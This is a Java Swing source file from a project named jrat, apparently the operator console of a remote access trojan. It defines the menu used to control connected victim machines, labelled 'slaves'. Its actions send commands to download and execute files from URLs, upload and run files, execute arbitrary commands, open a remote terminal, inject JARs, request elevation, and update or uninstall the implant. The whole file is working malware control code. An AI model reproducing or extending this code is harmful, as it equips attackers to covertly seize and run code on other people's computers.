package jrat.controller.ui.panels;

import jrat.api.Resources;
import jrat.common.downloadable.Downloadable;
import jrat.controller.AbstractSlave;
import jrat.controller.OfflineSlave;
import jrat.controller.Slave;
import jrat.controller.net.URLParser;
import jrat.controller.packets.outgoing.*;
import jrat.controller.settings.StoreOfflineSlaves;
import jrat.controller.threads.ThreadUploadFile;
import jrat.controller.ui.dialogs.DialogFileType;
import jrat.controller.ui.frames.*;
import jrat.controller.utils.NetUtils;
import jrat.controller.utils.Utils;

import javax.swing.*;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.List;

@SuppressWarnings("serial")
public abstract class PanelMainClients extends JScrollPane {

	public PanelMainClients() {
		
	}
	
	/**
	 * Return name to describe this view
	 * @return
	 */
	public abstract String getViewName();
	
	public abstract Icon getIcon();
	
	public abstract void addSlave(AbstractSlave slave);
	
	public abstract void removeSlave(AbstractSlave slave);

	public abstract AbstractSlave getSlave(int row);
	
	public abstract List<AbstractSlave> getSelectedSlaves();
	
	public abstract AbstractSlave getSelectedSlave();
	
	public abstract void clear();

	/**
	 * Returns the configuration menu for this view
	 * @return
	 */
	public abstract List<JMenuItem> getConfigMenu();

	public JMenu mnQuickOpen;
	
	/**
	 * Returns the default popup menu for each {@link AbstractSlave}
	 * @return
	 */
	public final JPopupMenu getPopupMenu() {
		final JPopupMenu popupMenu = new JPopupMenu();
		
		JMenuItem mntmControlPanel = new JMenuItem("Control Panel                       ");
		mntmControlPanel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameControlPanel screen = new FrameControlPanel((Slave) slave);
					screen.setVisible(true);
				}
			}
		});
		mntmControlPanel.setIcon(Resources.getIcon("controlpanel"));

		popupMenu.add(mntmControlPanel);
		popupMenu.addSeparator();

		JMenu mnNetworking = new JMenu("Networking");
		mnNetworking.setIcon(Resources.getIcon("process"));
		popupMenu.add(mnNetworking);

		JMenuItem mntmexe = new JMenuItem("Download and Execute");
		mnNetworking.add(mntmexe);
		mntmexe.setIcon(Resources.getIcon("arrow-down"));

		JMenuItem mntmUploadAndExecute = new JMenuItem("Upload and Execute");
		mntmUploadAndExecute.setIcon(Resources.getIcon("drive-upload"));
		mntmUploadAndExecute.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					JFileChooser f = new JFileChooser();
					f.showOpenDialog(null);

					final File file = f.getSelectedFile();

					if (file == null) {
						return;
					}

					for (final AbstractSlave slave : servers) {
						if (slave instanceof Slave) {						
							((Slave)slave).addToSendQueue(new Packet42ServerUploadFile(file, file.getName(), true, new ThreadUploadFile(null, file.getName(), file) {
								@Override
								public void onComplete() {
									super.onComplete();
									((Slave) slave).addToSendQueue(new Packet17DownloadExecute(file.getName(), Downloadable.getFileExtension(file.getName()), file));
								}
							}));
						}
					}
				}
			}
		});
		mnNetworking.add(mntmUploadAndExecute);

		mnNetworking.addSeparator();

		JMenuItem mntmUpdateFromUrl = new JMenuItem("Update from URL");
		mnNetworking.add(mntmUpdateFromUrl);
		mntmUpdateFromUrl.setIcon(Resources.getIcon("update"));

		JMenuItem mntmUpdateFromFile = new JMenuItem("Update from File");
		mntmUpdateFromFile.setIcon(Resources.getIcon("drive-upload"));
		mntmUpdateFromFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					JFileChooser f = new JFileChooser();
					f.showOpenDialog(null);

					final File file = f.getSelectedFile();

					if (file == null) {
						return;
					}

					for (final AbstractSlave slave : servers) {
						
						if (slave instanceof Slave) {							
							((Slave)slave).addToSendQueue(new Packet42ServerUploadFile(file, file.getName(), true, new ThreadUploadFile(null, file.getName(), file) {
								@Override
								public void onComplete() {
									super.onComplete();
									((Slave) slave).addToSendQueue(new Packet18Update(file));
								}
							}));
						}
					}
				}
			}
		});
		mnNetworking.add(mntmUpdateFromFile);

		mnNetworking.addSeparator();

		JMenuItem mntmHost = new JMenuItem("Host");
		mnNetworking.add(mntmHost);
		mntmHost.setIcon(Resources.getIcon("computer"));
		mntmHost.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null) {
					JOptionPane.showMessageDialog(null, slave.getHost(), "Host - " + slave.getIP(), JOptionPane.INFORMATION_MESSAGE);
				}
			}
		});
		mntmUpdateFromUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Update from URL", "Input URL to update with");
					if (result == null) {
						return;
					}
					try {
						URLParser.parse(result);
					} catch (Exception ex) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Update from URL", JOptionPane.ERROR_MESSAGE);
						return;
					}

					result = result.trim().replace(" ", "%20");

					for (AbstractSlave sl : servers) {
						if (sl instanceof Slave) {
							((Slave)sl).addToSendQueue(new Packet18Update(result));
						}
					}
				}
			}
		});
		mntmexe.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Download and Execute", "Input URL to download and execute");
					if (result == null) {
						return;
					}

					try {
						URLParser.parse(result);
					} catch (Exception ex) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
						return;
					}

					result = result.trim().replace(" ", "%20");

					String filetype = DialogFileType.showDialog();

					if (filetype == null) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet17DownloadExecute(result, filetype));
						}
					}
				}
			}
		});

		mnQuickOpen = new JMenu("Quick Open");
		mnQuickOpen.setIcon(Resources.getIcon("application-import"));
		popupMenu.add(mnQuickOpen);

		JMenuItem mntmVisitUrl = new JMenuItem("Visit URL");
		mnQuickOpen.add(mntmVisitUrl);
		mntmVisitUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Visit URL", "Input URL to visit");
					
					if (result != null && !NetUtils.isURL(result)) {
						result = "http://" + result;
					}
					
					if (result == null) {
						return;
					}

					if (!NetUtils.isURL(result)) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Visit URL", JOptionPane.ERROR_MESSAGE);
						return;
					}

					result = result.trim();

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet14VisitURL(result));
						}
					}
				}

			}
		});
		mntmVisitUrl.setIcon(Resources.getIcon("application-browser"));

		JMenuItem mntmRemoteCmd = new JMenuItem("Remote Terminal");
		mntmRemoteCmd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteShell frame = new FrameRemoteShell((Slave) slave);
					frame.setVisible(true);
				}
			}
		});
		mntmRemoteCmd.setIcon(Resources.getIcon("terminal"));
		mnQuickOpen.add(mntmRemoteCmd);

		JMenuItem mntmNotes = new JMenuItem("Notes");
		mntmNotes.setIcon(Resources.getIcon("notes"));
		mntmNotes.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameNotes frame = new FrameNotes((Slave) slave);
					frame.setVisible(true);
				}
			}
		});
		mnQuickOpen.add(mntmNotes);
		
		JMenu mnTools_1 = new JMenu("Tools");
		mnTools_1.setIcon(Resources.getIcon("toolbox"));
		popupMenu.add(mnTools_1);
		
				JMenuItem mntmRunCommand = new JMenuItem("Run Command");
				mnTools_1.add(mntmRunCommand);
				mntmRunCommand.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent arg0) {
						List<AbstractSlave> servers = getSelectedSlaves();
						if (servers.size() > 0) {
							String process = Utils.showDialog("Run Command", "Select command to send to connections");
							if (process == null) {
								return;
							}

							for (AbstractSlave slave : servers) {
								if (slave instanceof Slave) {
									((Slave)slave).addToSendQueue(new Packet38RunCommand(process));
								}
							}
						}
					}
				});
				mntmRunCommand.setIcon(Resources.getIcon("execute"));

		JMenu mnInject = new JMenu("Inject JAR");
		mnTools_1.add(mnInject);
		mnInject.setIcon(Resources.getIcon("inject"));

		JMenuItem mntmInjectFromUrl = new JMenuItem("Inject from URL");
		mntmInjectFromUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String url;

					url = Utils.showDialog("Inject from URL", "Type file URL");

					if (url == null || url != null && url.length() == 0) {
						return;
					}

					String mainClass;

					mainClass = Utils.showDialog("Inject from URL", "Type the JAR file entry point class name");

					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet98InjectJAR(url, mainClass));
						}
					}
				}
			}
		});
		mntmInjectFromUrl.setIcon(Resources.getIcon("arrow-down"));
		mnInject.add(mntmInjectFromUrl);

		JMenuItem mntmInjectFromFile = new JMenuItem("Inject from file");
		mntmInjectFromFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					JFileChooser f = new JFileChooser();
					f.showOpenDialog(null);

					File file = f.getSelectedFile();

					if (file == null) {
						return;
					}

					String mainClass;

					mainClass = Utils.showDialog("Inject from File", "Type the JAR file entry point class name");

					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet98InjectJAR(file, mainClass));
						}
					}
				}
			}
		});
		mntmInjectFromFile.setIcon(Resources.getIcon("drive-upload"));
		mnInject.add(mntmInjectFromFile);
		
		JMenuItem mntmRequestElevation = new JMenuItem("Request Elevation");
		mntmRequestElevation.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();

				for (AbstractSlave slave : servers) {
					if (slave instanceof Slave) {
						((Slave)slave).addToSendQueue(new Packet100RequestElevation());
					}
				}
			}
		});
		mntmRequestElevation.setIcon(Resources.getIcon("shield"));
		mnTools_1.add(mntmRequestElevation);
		popupMenu.addSeparator();

		JMenuItem mntmInfo = new JMenuItem("Info");
		mntmInfo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameSystemInfo screen = new FrameSystemInfo((Slave) slave);
					screen.setVisible(true);
				}
			}
		});
		mntmInfo.setIcon(Resources.getIcon("info"));
		popupMenu.add(mntmInfo);

		JMenuItem mntmForceDisconnect = new JMenuItem("Disconnect");
		mntmForceDisconnect.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet11Disconnect());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		JMenuItem mntmRestart = new JMenuItem("Restart");
		mntmRestart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm restarting " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet37RestartJavaProcess());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		JMenuItem mntmRename = new JMenuItem("Rename");
		mntmRename.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRename screen = new FrameRename((Slave) slave);
					screen.setVisible(true);
				}
			}
		});
		mntmRename.setIcon(Resources.getIcon("rename"));
		popupMenu.add(mntmRename);
		popupMenu.addSeparator();
		mntmRestart.setIcon(Resources.getIcon("refresh"));
		popupMenu.add(mntmRestart);

		JMenuItem mntmRestartConnection = new JMenuItem("Reconnect");
		mntmRestartConnection.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm reconnect " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet45Reconnect());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});
		mntmRestartConnection.setIcon(Resources.getIcon("refresh-blue"));
		popupMenu.add(mntmRestartConnection);
		mntmForceDisconnect.setIcon(Resources.getIcon("delete"));
		popupMenu.add(mntmForceDisconnect);

		JMenuItem mntmUninstall = new JMenuItem("Uninstall");
		mntmUninstall.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet36Uninstall());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		mntmUninstall.setIcon(Resources.getIcon("exit"));
		popupMenu.add(mntmUninstall);
		
		popupMenu.addPopupMenuListener(new PopupMenuListener() {
			public void popupMenuCanceled(PopupMenuEvent arg0) {

			}

			public void popupMenuWillBecomeInvisible(PopupMenuEvent arg0) {
				try {
					for (int i = 0; i < popupMenu.getComponents().length; i++) {
						Component child = popupMenu.getComponents()[i];
						if (child instanceof JMenuItem) {
							JMenuItem item = (JMenuItem) child;

							if (item.getText().equals("Remove")) {
								popupMenu.remove(i - 1);
								popupMenu.remove(child);
							}
						}
					}
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}

			public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
				try {
					final List<AbstractSlave> list = getSelectedSlaves();

					if (list.size() > 0) {
						boolean offlineExists = false;

						for (AbstractSlave slave : list) {
							if (slave instanceof OfflineSlave) {
								offlineExists = true;
							}
						}

						if (offlineExists) {
							popupMenu.addSeparator();

							JMenuItem mntmRemove = new JMenuItem("Remove");
							mntmRemove.setIcon(Resources.getIcon("delete"));

							mntmRemove.addActionListener(new ActionListener() {
								@Override
								public void actionPerformed(ActionEvent e) {
									for (int i = 0; i < list.size(); i++) {
										AbstractSlave slave = list.get(i);

										if (slave instanceof OfflineSlave) {
											OfflineSlave offline = (OfflineSlave) slave;
											StoreOfflineSlaves.getGlobal().remove(offline);
											removeSlave(slave);
										}
									}
								}
							});

							popupMenu.add(mntmRemove);
						}
					}

					repaint();
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});

		return popupMenu;
	}

}
